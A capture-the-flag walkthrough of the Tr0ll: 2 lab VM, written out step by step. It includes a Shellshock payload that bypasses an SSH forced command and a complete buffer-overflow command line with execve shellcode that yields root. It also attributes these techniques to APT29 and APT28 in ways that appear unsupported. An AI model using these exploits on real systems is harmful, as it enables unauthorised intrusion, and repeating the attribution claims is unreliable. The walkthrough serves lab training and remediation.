# Tr0ll: 2 — Shellshock, Steganography, and a Door That Reboots You

( ͡° ͜ʖ ͡°) Alright guys!! Tr0ll 2 turns up the difficulty and the trolling simultaneously. Three doors, only one leads forward — and the wrong ones either lock you out for two minutes or reboot the entire VM. Legit chaotic. The attack chain combines FTP credential access, steganography hidden in a JPEG comment, base64 decoding, Shellshock (CVE-2014-6271) via SSH `command=` restriction bypass, and the same 32-bit SUID buffer overflow from Tr0ll 1. The twist: binaries shuffle on every reboot. Always fingerprint by file size, not by door number. Respect to maleus for layering the complexity perfectly.

| Field | Value |
|---|---|
| **Level** | Beginner/Intermediate |
| **Target VM** | Tr0ll: 2 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tr0ll-2,107/ |
| **Techniques** | Nmap service enumeration, FTP credential access, HTTP steganography (JPEG comment), base64 decoding, ZIP password cracking, RSA key extraction, Shellshock CVE-2014-6271 SSH bypass, SUID binary discovery, 32-bit stack buffer overflow, shellcode injection |
| **CVEs** | CVE-2014-6271 (Shellshock: bash function definition execution in environment variables), CWE-121 (Stack-based Buffer Overflow in SUID binary), CWE-312 (Cleartext credential storage) |
| **APT Groups** | APT29 (Cozy Bear): exploited Shellshock in targeted SSH forced-command bypass scenarios; APT28: uses steganography-based lateral information embedding in phishing and file-drop campaigns |

---

## Attack Summary

```
nmap → FTP (21), SSH (22), HTTP (80)
  → FTP Tr0ll:Tr0ll → lmao.zip (password-protected)
  → HTTP robots.txt → 20+ disallowed paths (mostly decoys)
  → /dont_bother/cat_the_troll.jpg → tail/strings → "Look Deep within y0ur_self"
  → HTTP /y0ur_self/answer.txt → base64 decode → line of length 30
  → ZIP password: ItCantReallyBeThisEasyRightLOL → noob RSA key
  → SSH -i noob noob@target → "TRY HARDER LOL!" (forced command)
  → Shellshock: ssh -t "() { :; }; /bin/bash" → uid=1002(noob)
  → /nothing_to_see_here/choose_wisely/door{1,2,3}/r00t
  → identify BOF binary by size 8401 bytes
  → GDB: offset 268 → EIP overwrite
  → shellcode in NOP sled → uid=0(root)
  → cat /root/Proof.txt → a70354f0258dcc00292c72aab3c8b1e4
```

---

## Methodology

1. Full port scan to identify FTP, SSH, HTTP
2. FTP login with non-anonymous credentials (found via web enumeration)
3. HTTP steganography: JPEG comment reveals hidden path
4. base64 decode to extract ZIP password
5. ZIP extraction yields RSA private key for SSH
6. Shellshock bypass of SSH forced-command restriction
7. Door selection: identify real BOF binary by file size
8. GDB offset analysis and buffer overflow exploitation
9. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
nmap -sn 192.168.56.0/24
# Target: 192.168.56.106

nmap -sV -A -p 21,22,80 192.168.56.106
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4
80/tcp open  http    Apache httpd 2.2.22
```

OpenSSH 5.9p1 on Debian: old enough for Shellshock conditions to apply. vsftpd 2.0.8 is older than Tr0ll 1's 3.0.2, suggesting non-anonymous credentials this time.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — HTTP Enumeration: Finding the Steg Path

```bash
curl -s http://192.168.56.106/robots.txt
```

`robots.txt` disallows 20+ paths — classic troll misdirection. Scan a few but do not chase every one. Key finding: `/dont_bother/` contains a JPEG file:

```bash
wget http://192.168.56.106/dont_bother/cat_the_troll.jpg

# Check for appended data
tail -c 200 cat_the_troll.jpg
# → "Look Deep within y0ur_self for the answer"

strings cat_the_troll.jpg | tail -5
# → same hint
```

The hint points directly to the path `/y0ur_self/`:

```bash
wget http://192.168.56.106/y0ur_self/answer.txt
```

**Real-world note:** Hiding data in JPEG comments and appended bytes is a classic steganography technique (CWE-312 adjacent). In real threat intelligence cases, APT28 has used appended data in legitimate-looking image files as a covert channel for C2 configuration delivery.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1083 — File and Directory Discovery

---

## Step 3 — FTP Login and ZIP Retrieval

First, determine FTP credentials. The machine name gives it away: Tr0ll:Tr0ll.

```bash
ftp 192.168.56.106
# Name: Tr0ll
# Password: Tr0ll

ftp> get lmao.zip
ftp> bye
```

The ZIP is password-protected. The password comes from `answer.txt`.

**MITRE ATT&CK:** T1078 — Valid Accounts

---

## Step 4 — Decode ZIP Password from answer.txt

```bash
base64 -d answer.txt > decoded.txt
cat decoded.txt | awk 'length==30'
# → ItCantReallyBeThisEasyRightLOL
```

The decoded content is a wordlist-style file. The password is the line with exactly 30 characters. The name is another troll: it really is that easy.

```bash
unzip -P ItCantReallyBeThisEasyRightLOL lmao.zip
# → extracts: noob (RSA private key PEM)
chmod 600 noob
```

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials in Files

---

## Step 5 — SSH Shellshock Bypass (CVE-2014-6271)

Normal SSH with the key hits a forced command restriction:

```bash
ssh -i noob noob@192.168.56.106
# → TRY HARDER LOL!
# (forced command in authorized_keys: command="echo TRY HARDER LOL!")
```

The `authorized_keys` entry has `command="echo TRY HARDER LOL!"` prepended to the public key. On bash versions before 4.3 patch, function definitions passed in environment variables execute before the forced command runs. This is Shellshock.

Bypass using `-t` to pass a bash function definition as the command:

```bash
ssh -i noob \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o HostKeyAlgorithms=+ssh-rsa \
    noob@192.168.56.106 \
    -t "() { :; }; /bin/bash"
```

Expected:

```
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```

**Real-world note:** CVE-2014-6271 (Shellshock) was patched in September 2014 but remained unpatched on millions of systems for years. APT29 used Shellshock in targeted SSH `command=` bypass scenarios in 2014-2015. The pattern of using `command=` as the only restriction — without ensuring the underlying shell is patched — is a layered security failure that Shellshock exposed globally.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Door Selection: Identify the Real BOF Binary

```bash
ls -la /nothing_to_see_here/choose_wisely/
# door1/  door2/  door3/

# The two wrong doors:
# - One removes permissions for 2 minutes
# - One reboots the VM
# Always identify by file size: the BOF binary is exactly 8401 bytes

ls -la /nothing_to_see_here/choose_wisely/door*/r00t
# Find which door contains the 8401-byte binary
# Example: door2/r00t is 8401 bytes — this is the target
```

Note: binaries shuffle positions on every reboot. Never hardcode the door number. Always check file size.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1548.001 — Setuid and Setgid

---

## Step 7 — Buffer Overflow: Find EIP Offset

```bash
gdb -q /nothing_to_see_here/choose_wisely/door2/r00t

(gdb) run $(python -c "print 'A'*268 + 'B'*4 + 'C'*16")
# Program received signal SIGSEGV, Segmentation fault.
# 0x42424242 in ?? ()   ← EIP = BBBB
# Offset = 268 bytes (same as Tr0ll 1)
```

Find ESP for return address:

```bash
(gdb) x $esp
# 0xbffffb50: 0x43434343
# Real (outside GDB): ~0xbffffb90 (adjust by +0x40 for env overhead)
```

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Step 8 — Buffer Overflow Exploit

Linux x86 `execve("/bin/sh")` shellcode (19 bytes):

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

Run from inside the Shellshock shell, in the correct door directory:

```bash
DOOR=/nothing_to_see_here/choose_wisely/door2
cd $DOOR
./r00t $(python -c \
  'print "A"*268 + "\x90\xfb\xff\xbf" + "\x90"*16 + \
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

```
# id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
# whoami
root
```

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Step 9 — Root Flag

```bash
cat /root/Proof.txt
```

```
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```

(☞ﾟヮﾟ)☞ Root. gg nailed it dude.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| FTP credential | `Tr0ll:Tr0ll` | Machine name hint | FTP login, ZIP download |
| ZIP password | `ItCantReallyBeThisEasyRightLOL` | base64 decode of /y0ur_self/answer.txt | Unzip noob RSA key |
| RSA key | noob (PEM private key) | lmao.zip via FTP | SSH authentication |
| Shellshock | `() { :; }; /bin/bash` | CVE-2014-6271 | Bypass SSH command= restriction |
| Root flag | `a70354f0258dcc00292c72aab3c8b1e4` | /root/Proof.txt | Challenge completion |
| BOF offset | 268 bytes to EIP | GDB pattern analysis | Exploit construction |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Shellshock (CVE-2014-6271) bypasses command= restriction | Millions of systems were vulnerable; APT29 exploited this pattern in 2014-2015 for SSH bypass | Patch bash to ≥ 4.3; command= is not a security boundary without a patched shell |
| 2 | Steganography in JPEG appended data | APT28 uses appended image data for covert C2 config delivery | Inspect image files with exiftool and strings; scan for appended data anomalies |
| 3 | base64-encoded wordlist as password carrier | Encoding is not encryption: base64 is trivially decoded by any attacker | Never use encoding as a security control; use encryption with proper key management |
| 4 | SUID BOF with shuffling doors troll mechanic | Binary shuffling forces size-based identification; real SUID binary audits use hashing, not names | Always fingerprint SUID binaries by hash and size; automate audits with tripwire/AIDE |
| 5 | RSA private key in ZIP accessible via FTP | Key-based SSH auth is only as strong as the protection of the private key itself | Never distribute private keys via FTP; use key distribution via secure channels only |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information | T1027 |
| Credential Access | Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Privilege Escalation | Privilege Escalation | Setuid and Setgid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Patch bash against Shellshock**: upgrade to bash 4.3+ with the Shellshock patches applied; `command=` in authorized_keys is not a security boundary on unpatched bash
2. **Never distribute RSA private keys via FTP**: use secure, authenticated channels for key distribution; consider certificate-based SSH
3. **Remove FTP credentials matching the VM name**: enforce password policies; Tr0ll:Tr0ll is a default credential
4. **Compile SUID binaries with full mitigations**: `-fstack-protector-all`, PIE, NX stack
5. **Enable ASLR system-wide**: `echo 2 > /proc/sys/kernel/randomize_va_space`
6. **Audit all SUID binaries by hash and size**: use AIDE or tripwire for integrity monitoring

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all SSH configurations; audit SUID binary count |
| Protect | Access Control | Patch bash; remove FTP default credentials; use certificate SSH |
| Protect | Data Security | No private keys on FTP; no base64-encoded passwords in web root |
| Detect | Anomalies and Events | Alert on Shellshock-pattern SSH connections; SUID execution monitoring |
| Respond | Response Planning | Rotate all exposed keys; patch bash immediately |
| Recover | Recovery Planning | Rebuild compromised host; rekey all SSH |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict FTP to authenticated users only |
| AC-6 | Least Privilege | Remove SUID from non-essential binaries |
| CM-7 | Least Functionality | Patch bash; disable FTP or require authentication |
| IA-5 | Authenticator Management | Rotate RSA keys; enforce strong FTP passwords |
| SI-2 | Flaw Remediation | Patch CVE-2014-6271 (Shellshock) immediately |
| SI-16 | Memory Protection | Enable ASLR, NX; compile with stack protector |

### CISA KEV

CVE-2014-6271 (Shellshock) is catalogued in the CISA Known Exploited Vulnerabilities catalog. CISA mandates patching for all federal agencies and strongly recommends immediate patching for all organizations. The pattern of `command=` restriction without Shellshock-patched bash is explicitly called out as an insufficient mitigation.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL3 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (patch bash; disable FTP anonymous access)
- **D3-OAM** — Operating System Administrative Management (ASLR, NX, stack canary; SUID audit)
- **D3-UA** — User Account Management (remove default FTP credentials; rekey SSH)

---

## Final Thoughts

Tr0ll: 2 is a masterclass in layered misdirection with real vulnerability depth. The Shellshock bypass is the highlight: it teaches a fundamental principle that `command=` in authorized_keys does not sandbox the shell itself — it only controls what runs after the shell initializes. If the shell is vulnerable, the restriction is worthless. That is a real-world lesson that applies to dozens of SSH configurations in production today.

The door mechanic is infuriating in the best possible way. Being rebooted by your own exploit attempt is a humbling experience that teaches you to read before you click. Size-based fingerprinting is the actual skill being drilled here. wild ride, no cap. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
